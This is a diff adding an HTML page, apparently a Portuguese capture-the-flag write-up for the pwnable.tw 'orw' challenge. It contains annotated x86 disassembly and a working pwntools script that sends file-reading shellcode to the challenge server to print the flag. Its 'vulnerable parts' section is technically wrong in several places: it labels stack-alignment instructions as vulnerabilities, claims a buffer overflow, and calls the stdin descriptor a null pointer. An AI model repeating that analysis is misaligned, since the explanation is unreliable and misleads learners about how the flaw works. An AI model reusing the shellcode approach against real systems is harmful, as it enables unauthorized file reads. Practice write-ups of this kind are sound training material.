@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Exploração de Vulnerabilidades no Binário orw</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 1200px;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        h2, h3 {
+            font-size: 1.5rem;
+            margin-bottom: 0.75rem;
+        }
+
+        p, li {
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        pre {
+            font-size: 1rem;
+            overflow-x: auto;
+            background: #333;
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        code {
+            font-size: 1rem;
+            color: #dcdcaa;
+            background: #333;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+
+        ul, ol {
+            margin-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Análise e Exploração do Binário orw</h1>
+
+        <h2>Introdução</h2>
+        <p>Este paper aborda a análise de segurança do binário <code>orw</code>, destacando suas vulnerabilidades e a exploração para obter a flag. O foco principal será a execução de código malicioso através da injeção de shellcode.</p>
+
+        <h2>Análise do Binário</h2>
+        <pre><code>0x08048548 <+0>:     lea    ecx,[esp+0x4]            <==== Carrega o endereço do argumento da função
+0x0804854c <+4>:     and    esp,0xfffffff0           <==== Alinha a pilha para 16 bytes
+0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]      <==== Empilha valor de `ecx - 4`
+0x08048552 <+10>:    push   ebp                       <==== Salva o ponteiro base anterior
+0x08048553 <+11>:    mov    ebp,esp                  <==== Estabelece novo ponteiro base da pilha
+0x08048555 <+13>:    push   ecx                       <==== Empilha o valor de `ecx`
+0x08048556 <+14>:    sub    esp,0x4                   <==== Reserva 4 bytes na pilha
+0x08048559 <+17>:    call   0x80484cb <orw_seccomp>  <==== Chama a função `orw_seccomp`
+0x0804855e <+22>:    sub    esp,0xc                   <==== Reserva 12 bytes na pilha
+0x08048561 <+25>:    push   0x80486a0                 <==== Empilha o endereço da mensagem para `printf`
+0x08048566 <+30>:    call   0x8048380 <printf@plt>    <==== Chama `printf` para exibir a mensagem
+0x0804856b <+35>:    add    esp,0x10                  <==== Limpa a pilha após `printf`
+0x0804856e <+38>:    sub    esp,0x4                   <==== Reserva 4 bytes na pilha
+0x08048571 <+41>:    push   0xc8                      <==== Empilha o valor 200 (bytes a ler)
+0x08048576 <+46>:    push   0x804a060                 <==== Empilha o endereço do buffer
+0x0804857b <+51>:    push   0x0                       <==== Empilha um ponteiro nulo
+0x0804857d <+53>:    call   0x8048370 <read@plt>      <==== Chama `read` para ler a entrada
+0x08048582 <+58>:    add    esp,0x10                  <==== Limpa a pilha após `read`
+0x08048585 <+61>:    mov    eax,0x804a060             <==== Move o endereço do buffer para `eax`
+0x0804858a <+66>:    call   eax                        <==== Chama a função do shellcode
+0x0804858c <+68>:    mov    eax,0x0                   <==== Define valor de retorno como zero
+0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]   <==== Restaura o valor da variável local
+0x08048594 <+76>:    leave                             <==== Limpa a pilha e restaura ponteiro base
+0x08048595 <+77>:    lea    esp,[ecx-0x4]             <==== Ajusta o topo da pilha
+0x08048598 <+80>:    ret                               <==== Retorna ao chamador</code></pre>
+
+        <h2>Partes Vulneráveis</h2>
+        <p>As seguintes partes do código são vulneráveis:</p>
+        <ul>
+            <li><code>lea ecx,[esp+0x4]</code>: Carrega o endereço de um argumento que pode ser manipulado.</li>
+            <li><code>sub esp,0x4</code> e <code>sub esp,0xc</code>: Reservas de espaço na pilha que podem levar a buffer overflow se não forem controladas.</li>
+            <li><code>push 0xc8</code>: O valor fixo (200) pode ser explorado se o buffer for superado.</li>
+            <li><code>push 0x804a060</code>: Empilha o endereço de um buffer, potencialmente acessível por um atacante.</li>
+            <li><code>call read</code>: Chamada de entrada sem validação pode permitir buffer overflow.</li>
+            <li><code>mov eax,0x804a060</code> e <code>call eax</code>: Executa código a partir de um endereço arbitrário, aumentando o risco de exploração.</li>
+        </ul>
+
+        <h2>Explicação das Vulnerabilidades</h2>
+        <p>Ao realizar a engenharia reversa do binário <code>orw</code>, observa-se que o programa simplesmente executa o <code>shellcode</code> fornecido pelo usuário. A função main lê a entrada do usuário com <code>read</code> e a utiliza para chamar uma função que executa o <code>shellcode</code>. Essa simplicidade expõe vulnerabilidades, tornando-o suscetível a explorações como buffer overflow.</p>
+
+        <h2>Crafting the Exploit Script</h2>
+        <p>Utilizando a biblioteca <code>pwntools</code> para criar nosso script de exploit:</p>
+        <pre><code>from pwn import *
+
+r = remote('chall.pwnable.tw', 10001)
+
+sc = asm(
+    shellcraft.i386.linux.open('/home/orw/flag') +
+    shellcraft.i386.linux.read('eax', 'esp', 50) +
+    shellcraft.i386.linux.write('1', 'esp', 50)
+)
+
+r.sendafter(b':', sc)
+flag = r.recvuntil(b'}')
+
+success(f'Flag: {flag.decode()}')
+
+r.interactive()</code></pre>
+
+        <h2>Conclusão</h2>
+        <p>Neste desafio, foi possível explorar as vulnerabilidades do binário <code>orw</code> e executar um shellcode que abre e lê o arquivo da flag. A análise detalhada e a exploração das vulnerabilidades confirmam a importância de validar a entrada do usuário e implementar proteções adequadas para evitar a execução não autorizada de código.</p>
+    </div>
+</body>
+</html>
